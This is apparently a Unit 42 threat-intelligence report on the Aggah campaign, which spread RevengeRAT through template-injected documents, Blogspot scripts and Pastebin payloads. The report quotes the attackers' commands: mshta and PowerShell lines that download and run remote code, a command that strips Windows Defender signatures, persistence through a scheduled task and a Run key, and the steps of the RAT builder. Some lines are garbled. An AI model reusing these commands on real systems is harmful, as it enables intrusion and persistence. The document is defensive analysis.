Further analysis revealed that this activity is likely part of a much larger campaign impacting not only that region but also the United\nStates, and throughout Europe and Asia.\n\nOur analysis of the delivery document revealed it was built to load a malicious macro-enabled document from a remote server via Template\nInjection. These macros use BlogSpot posts to obtain a script that uses multiple Pastebin pastes to download additional scripts, which\nultimately result in the final payload being RevengeRAT configured with a duckdns[.]org domain for C2. During our research, we found several\nrelated delivery documents that followed the same process to ultimately install RevengeRAT hosted on Pastebin, which suggests the actors\nused these TTPs throughout their attack campaign.\n\nInitially, we believed this activity to be potentially associated with the Gorgon Group. Our hypothesis was based on the high level TTPs\nincluding the use of RevengeRAT. However, Unit 42 has not yet identified direct overlaps with other high-fidelity Gorgon Group indicators.\nBased on this, we are not able to assign this activity to the Gorgon group with an appropriate level of certainty.\n\nIn light of that, Unit 42 refers to the activity described in this blog as the Aggah Campaign based on the actor’s alias “hagga”, which was used\nto split data sent to the RevengeRAT C2 server and was the name of one of the Pastebin accounts used to host the RevengeRAT payloads.\n\n## The Delivery\n\nOur research into the Aggah campaign began with a delivery document sent to organizations in a single Middle Eastern country via an email\non March 27, 2019. This email appeared to originate from a large financial institution in the same country, although it was likely spoofed. The\nsubject of the email was “Your account is locked.” This initial delivery document was sent to organizations in one Middle Eastern country,\nspecifically to organizations in the education, media/marketing, and government verticals. Four days later on March 31, we saw the same\ndelivery email sent to a financial organization in a second Middle Eastern country. We later discovered that this delivery document was just one\nof many in a larger campaign sent to organizations in the United States, Europe and Asia targeting the same verticals as in the Middle East as\nwell as Technology, Retail, Manufacturing, State/Local Government, Hospitality, Medical, Technology, and other Professional business. The\n\nl t d d t f ti ll i il ill d ib th i i l l l d\n\n\n-----\n\ne e a se t o a c ad a o d docu e t attac ed t t e e a e ct ty doc (S 56\nd7c92a8aa03478155de6813c35e84727ac9d383e27ba751d833e5efba3d77946) that attempted to load a remote OLE document via Template\nInjection. When “Activity.doc” is opened, it displays the image in Figure 1 as a lure in an attempt to trick the user into enabling content to allow\nmacros to run. The lure suggests that the user must open the document in the desktop versions of Microsoft Word, as macros do not function\nin the online version of Word in Office 365.The “Activity.doc” file does not contain a macro, but the OLE document that it loads from the remote\nserver does contain a macro.\n\n_Figure 1. Lure image used in Activity.doc to trick user into enabling macros_\n\n## Activity.doc Analysis\n\n[The delivery document uses Template Injection to load a file hosted on a remote server. Figure 2 shows the contents of the delivery](https://attack.mitre.org/techniques/T1221/)\ndocument’s footer that attempts to load a remote OLE document\nfrom hxxps://static.wixstatic[.]com/ugd/05e470_b104c366c1f7423293887062c7354db2.doc:\n\n_Figure 2. Footer in Activity.doc showing remote OLE location_\n\nThe remote OLE file loaded in the footer of Activity.doc file is actually an RTF file (SHA256:\n5f762589cdb8955308db4bba140129f172bf2dbc1e979137b6cc7949f7b19e6f) that loads an embedded Excel document with a heavily\nobfuscated macro that contains a significant amount of ‘junk’ code. The purpose of this macro is to decode and execute the following URL via\nthe \"Shell\" command:\n\nmshta hxxp://www.bitly[.]com/SmexEaldos3\n\nThe command above uses the built-in “mshta” application to download the contents of URL provided, in this case a shortened URL using the\nBit.ly service. During WildFire's analysis, the shortened bit.ly URL redirected to hxxps://bjm9.blogspot[.]com/p/si.html, as seen in the “Location”\nfield of the HTTP response in Figure 3.\n\n\n-----\n\n_Figure 3. Bit.ly shortened link pointing to blog hosted at Blogspot_\n\nAs you can see in the GET request above, the redirect points the browser (“mshta.exe” in this case) to a blog hosted on blogspot[.]com. As\nyou can see in Figure 4, this BlogSpot article appears a bit odd but not necessarily malicious.\n\n_Figure 4._\n\n_bjm9.blogspot[.]com screen capture_\n\nBy analyzing the code hosted on the blog, we discovered it actually includes a JavaScript embedded within it that performs several activities.\nFigure 5 shows the malicious JavaScript hosted at the seemingly innocuous blog.\n\n_Figure 5 Script embedded in bjm9 Blogspot article_\n\n\n-----\n\ne a c ous sc pt ca es out se e a act t es o t e co p o sed syste st, t atte pts to a pe c oso t e e de by e o g ts\nsignature set. The script also kills the Defender process along with the processes for several Office applications. All of this is performed using\nthe following command line:\n\ncmd.exe /c cd \"\"%ProgramFiles%\\Windows Defender\"\" & MpCmdRun.exe -removedefinitions -dynamicsignatures & taskkill /f /im winword.exe\n& taskkill /f /im excel.exe & taskkill /f /im MSPUB.exe & taskkill /f /im POWERPNT.EXE & forfiles /c \"\"taskkill /f /im MSASCuiL.exe\"\" & forfiles /c\n\"\"taskkill /f /im MpCmdRun.exe\"\" & exit\n\nThe script then attempts to disable security mechanisms within Office products, specifically by setting registry key values to enable macros and\nto disable ProtectedView. First, the script enables macros within Word, PowerPoint and Excel by setting the following registry keys to a value\nof \"1\":\n\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\VBAWarnings\n\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarnings\n\nThe

technique of enabling macros and disabling ProtectedView in Office, including the order in which the registry keys were modified was also\n[described in our blog covering the Gorgon group. Also, the tactic of killing processes for Windows Defender and Microsoft Office applications](https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/)\nwas also carried out by Gorgon as well. The Gorgon group also used the bitly URL shortening service in their attacks, but while these are\nobvious technique overlaps, we still do not have concrete evidence that this attack campaign is associated with Gorgon.\n\nThe script hosted on Blogspot then carries out three main activities that include:\n\n1. Downloading a payload from a Pastebin URL\n2. Creating a scheduled task to periodically obtain and run a script from a Pastebin URL\n3. Creating an autorun registry key to obtain and run a script from a Pastebin URL\n\n\n-----\n\n## Obtaining a payload from Pastebin\n\nThe script hosted at Blogspot obtains a portable executable payload from a Pastebin URL and executes it. The script builds the following\ncommand and attempts to run it using the WScript.Shell object:\n\nmshta.exe vbscript:CreateObject(\"\"Wscript.Shell\"\").Run(\"\"powershell.exe -noexit -command\n\n[Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object\nNet.WebClient).DownloadString(\\'h\\'+\\'t\\'+\\'t\\'+\\'p\\'+\\'s:\\'+\\'//p\\'+\\'a\\'+\\'s\\'+\\'t\\'+\\'e\\'+\\'b\\'+\\'i\\'+\\'n\\'+\\'.\\'+\\'c\\'+\\'o\\'+\\'m\\'+\\'/\\'+\\'r\\'+\\'a\\'+\\'w\\'+\\'/\\'+\\'2LDaeHE1\\\n(window.close)\n\nThe command above results in the downloading of a portable executable hosted on Pastebin at https://pastebin[.]com/raw/2LDaeHE1,\ndecoding the base64 downloaded from the URL, and then executing it. Figure 6 shows the Pastebin page hosting the executable downloaded\nby the script.\n\n_Figure_\n\n_6. 2LDaeHE1 Pastebin page_\n\nThe decoded payload has the following attributes:\n\nSHA256 b9b67c885200f90eaf9c4911b3a7f5e6707bcb51d1b892df1bde110 13a60f6b5\n\nCompile Time 2019-03-20 19:43:08\n\n_Table 2. Decoded payload from pastebin[.]com/raw/2LDaeHE1_\n\nThis payload was written in VB.NET and named \"Nuclear Explosion,\" which is a variant of RevengeRAT configured to use the domain\n\"lulla.duckdns[.]org\" for C2, as seen in Figure 7.\n\n\n-----\n\n_Figure 7. RevengeRAT configuration_\n\nAccording to its configuration seen in Figure 8, when sending data to the C2 server, it will split the information using the string \"hagga\", which\nis the same name as the PasteBin account hosting the payload information seen in Figure 6 and the basis of the Aggah campaign name.\n\n_Figure 8. Configuration showing the string \"hagga\" used to split information sent to the C2 server_\n\n## Creating a Scheduled Task\n\nThe script hosted at the Blogspot blog builds another command to create a scheduled task called \"eScan Backup\" that runs every 100\nminutes. The command string generated by the script used to create this scheduled task is:\n\nschtasks /create /sc MINUTE /mo 100 /tn eScan Backup /tr \"\"mshta vbscript:CreateObject(\"\"Wscript.Shell\"\").Run(\"\"mshta.exe\nhttps://pastebin[.]com/raw/tb5gHu2G\"\",0,true)(window.close)\"\" /F '\n\nThe “eScan Backup” task will use the built-in mshta application to download a script from a Pastebin URL, specifically at\nhxxps://pastebin[.]com/raw/tb5gHu2G that we will continue to refer to as the tb5gHu2G script. We believe the actors chose the name “eScan\nBackup” to appear related to the eScan antivirus products. Figure 9 shows the scheduled task in Windows’ Task Scheduler program.\n\n\n-----\n\n_Figure 9. Scheduled task created to reach out to Pastebin URL and run the hosted script every 100 minutes_\n\nThe scheduled task downloading and running the tb5gHu2G script is meant for persistence, as it runs the same command to hamper Windows\nDefender and kill Office applications. The tb5gHu2G script also attempts to run the same VBScript as the script hosted on the Blogspot blog, of\nwhich downloads and executes the payload from the “2LDaeHE1” Pastebin page shown in Figure 6. Figure 10 shows the Pastebin page\nhosting the tb5gHu2G script.\n\n_Figure 10. tb5gHu2G Pastebin page_\n\n## Creating an Autorun Registry Key\n\nThe script hosted at the Blogspot blog creates an autorun registry key, which appears to be a second persistence mechanism to supplement\nthe previously mentioned scheduled task. To create the autorun key, the script generates the following command that it will attempt to run:\n\nCreateObject(\"Wscript.Shell\").regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftUpdate\",\n\"C:\\Windows\\System32\\mshta.exe vbscript:CreateObject(\"\"Wscript.Shell\"\").Run(\"\"mshta.exe%20http://pastebin[.]com/raw/YYZq1XR0\"\",0,true)\n(window.close)\", \"REG_EXPAND_SZ\"\n\nThis run key will attempt to download the contents hosted at yet another Pastebin URL of http://pastebin[.]com/raw/YYZq1XR0\n\nand run the contents as a script using the Wscript.Shell object. Figure 11 shows the Pastebin page displaying the contents of the script.\n\n\n-----\n\n_Figure 11. YYZq1XR0 Pastebin page_\n\nThe YYZq1XR0 Pastebin paste contains the following script that does very little:\n\n<script language=\"VBScript\">\n\nself.close\n\n</script>\n\nThe fact that the above script does so little suggests that the actor may update this paste with a new script containing additional functionality\nwhen desired. The editing of pastes is possible if the paste was created using a \"Pro\" account. These pastes were created by an account\nnamed HAGGA, which appears to be a PRO account that would allow the actor to update the script to run on infected systems. HAGGA has\nseveral additional pastes as well as seen below in Figure 12. These pastes contain additional malicious scripts that are ultimately used to\ncreate a payload.\n\n_Figure 12. Hagga’s Pastebin page_\n\n## Part of a Larger Campaign?\n\nWhile investigating this particular campaign we reviewed the click count available on Bit.ly. As of April 11, 2019, the Bit.ly link, SmexEaldos3,\nreferenced in the analysis above contained over 1,900 clicks in about 20 countries spanning North America, Europe, Asia, and the Middle\nEast. This high volume click-count indicated to us that we were likely only looking at an extremely small subset of the actual campaign. It is\n\n\n-----\n\na so g y e y t at t ese c c cou ts a so c ude d dua s access g t e s o te ed du g est gat o s a d esea c e o ts;\ntherefore, the number is not an accurate representation of the number of hosts infected.\n\n_Figure 13. bitly SmexEaldos3 page clicks_\n\nDigging in a bit further we took a look at the document properties to see what additional information we may be able to use to help identify\nrelated activity. The document properties indicate these operators were using an apparently pirated version of Microsoft Word and used the\nstring ‘Lulli moti myri’ as the creator/author of the document. Using this string we searched in our repositories and identified over a dozen\nMicrosoft Office documents - half of them DOCX and the other half XLS.\n\nAll of the documents have a time stamp between January and April 2019, and each contained a Bit.ly URL that redirects to a Blogspot page.\nWhile all of these documents were of interest to us, we noticed one configured with the same Bit.ly URL as our original file Activity.doc. This\nfile has the following SHA256:\n\nSHA256 ef837119fc241e8fde85f36f4635a71f6b87aecf39dc979961be914 f48c4ef4c\n\n_Table 3. Similarly configured document to Activity.doc_\n\nDuring our analysis, we identified several Bit.ly URLs and their redirects resulting in the download of RevengeRAT. One particular sample\ncontains the C2 domain kronozzz2.duckdns[.]org. This sample has a SHA256 of:\n\nSHA256 c365b15cb567da7e9c04dffa0de1cb2b8104d5fe668c17691d8c683 80bcd6d30\n\n_Table 4. Decoded payload from pastebin[.]com/raw/sgawvit9_\n\nOne of HAGGA’s pastes includes the title ‘kronoz2 back2new’. This domain indicated to us another possible relation to the HAGGA Pastebin\naccount shown in Figure 12. Open source research revealed a similar domain kronoz.duckdns[.]org associated with a RevengeRAT sample\nwith the following hash:\n\nSHA256 fa5500a45e98e084b489301fd109676a4d8b0d3b39df4d9e2288569 e232a9401\n\n_Table 5. File associated with kronoz.duckdns[.]org_\n\nAll identified samples are available in Appendix A\n\n\n-----\n\nte e e g a o t e de e y docu e ts a d e e ge pay oads e d sco e ed t at a but o e pay oad co ta s t e ute\nRV_MUTEX-WindowsUpdateSysten32 (note the purposeful misspelling by the attackers of “Systen32” for “System32”) with a base64 encoded\nidentifier of SE9URUlTIE5PVk9T that decodes to HOTEIS NOVOS (“NEW HOTELS” in Portuguese). We searched through our available\nrepositories to see just how many samples contained these strings. We found over 50 files beginning as early as September 2018, which are\nnoted in Appendix A. Many of these samples contained the same ‘hagga’ key; however, we also noted three other additional keys: ‘oldman’,\n‘steve’, and ‘roma225’. The ‘roma225’ key was discussed in December 2018 in a publication titled ‘The Enigmatic “Roma225” Campaign’ by\nYoroi. The one sample that was not configured with that mutex and identifer was the sample noted in Table 5. That sample contains the mutex\nRV_MUTEX-cuiGGjjtnxDpnF and the Identifier TWlsZWdvbmE= which decodes to ‘Milegona’.\n\n## Correlating RevengeRAT samples\n\nRevengeRAT is a commodity Trojan that has many leaked builders freely available in open source, which makes attributing the tool’s use to a\nspecific actor or attack campaign difficult. Because of this, we wanted to determine if the mutex, identifier and key seen in Aggah related\nsamples were not standard default values for RevengeRAT and if they were strong enough to use for pivoting and correlation purposes. To\ngauge the likelihood of two unrelated actors using the same values in the configuration, we used the leaked RevengeRAT builder (v0.3) to\nvisualize the process an actor would have to take to create RevengeRAT samples that shared the same mutex, identifier and key as the\npayload delivered in the Aggah campaign.\n\nTo our surprise, we found it was rather unlikely that two unrelated individuals would use the mutex, identifier, and key just by happenstance.\nWe believe this as the actor must manually enter the mutex, identifier, and key into specific fields within the RevengeRAT builder, in which we\nwill highlight in the following explanation of steps required to build the Trojan.\n\nTo create the RevengeRAT payload used in this campaign, the actor would use the RevengeRAT server to compile an executable configured\nwith the appropriate fields. First, the actor would set the “Socket Key” field to “hagga” and press “Start Listening”, as seen in Figure 14.\n\n_Figure 14. RevengeRAT Builder_\n\n_Socket Key Setting_\n\nOnce the server is configured and listening, the actor would click the “Client Builder” button to create the RevengeRAT client, as seen in Figure\n15.\n\n\n-----\n\n_Figure 15. RevengeRAT Client_\n\n_Builder_\n\nIn the Client Builder, the actor would click the “Network Settings” drop down and enter the domain “lulla.duckdns[.]org” and the TCP port of\n2336 before pressing the add button seen in Figure 16.\n\n_Figure 16. RevengeRAT Network_\n\n_Settings setup_\n\nThe actor would then click the Basic Settings drop down and enter their chosen identifier “HOTEIS NOVOS” into the “Client Identifier” field and\nwould add “-WindowsUpdateSysten32” in the “Client Mutex” field, as it already contains “RV_MUTEX” by default. Figure 17 shows these\nvalues added to the correct fields. What is of interest to note here is that the actor manually added the string “-WindowsUpdateSysten32”\ninstead of clicking the plus (“+”) button available next to this field, which would concatenate a hyphen and a random string instead.\n\n\n-----\n\n_Figure 17. RevengeRAT Basic_\n\n_Settings setup_\n\nLastly, to compile the payload the actor has to agree to the Terms of Service and click the “Compile” button, as seen in Figure 18.\n\n_Figure 18. RevengeRAT Ready to_\n\n_compile_\n\nBy pressing the compile button, the RevengeRAT server will create a client executable with a default name of “Client.exe” that the actor can\nsave to the system prior to delivering it in their attack. Figure 19 shows the RevengeRAT client icon on the desktop.\n\n_Figure 19. RevengeRAT Client Icon_\n\nThe configuration within the compiled “Client.exe” seen in Figures 16 and 17 visually matches the configuration of the RevengeRAT\ndownloaded from Pastebin in the Aggah campaign, as seen in Figures 7 and 8.

However, after further analysis this appears to be just a small part of a much larger campaign which also seems to be affecting many\nregions including but not limited to the United States, Europe, and Asia. Unfortunately, our current data set does not afford insight into the\nattackers’ motivation other than to compromise a large number of victims.\n\nWhile a lot of this activity behaviorally appears to be potentially related to the Gorgon Group’s criminal activity, it is currently unclear and\n[requires additional analysis to prove. Both Unit 42 and](https://unit42.paloaltonetworks.com/operation-comando-or-how-to-run-a-cheap-and-effective-credit-card-business/) [Yoroi recently released similar blogs which also displayed similar tactics but were not](https://blog.yoroi.company/research/the-enigmatic-roma225-campaign/)\nassessed with a high level of confidence as related to the Gorgon Group. Although we are unsure of a connection to the Gorgon Group\nspecifically, we do assess that based on the unique configuration of these RevengeRAT samples that a common operator was likely involved in\nthe activity mentioned in this blog.\n\nRevengeRAT is a publicly available RAT which is seen in high volume. It appears as though some users of this RAT have moved from\nfollowing publicly available step-by-step guides to become a little more sophisticated in how they are leveraging alternative storage locations\nfor C2 support, such as Pastebin. These technique changes may help the operators by hiding behind legitimate services that are likely not\nblocked by security devices.\n\nPalo Alto Networks customers are protected from these operators in the following ways:\n\n[AutoFocus: Customers can currently track this campaign activity using the following tags: Aggah,](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Aggah) [RevengeRAT](https://autofocus.paloaltonetworks.com/#/tag/Unit42.RevengeRAT)\nWildFire and Traps: detects all malware supported in this report as malicious\n\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat\nAlliance members.
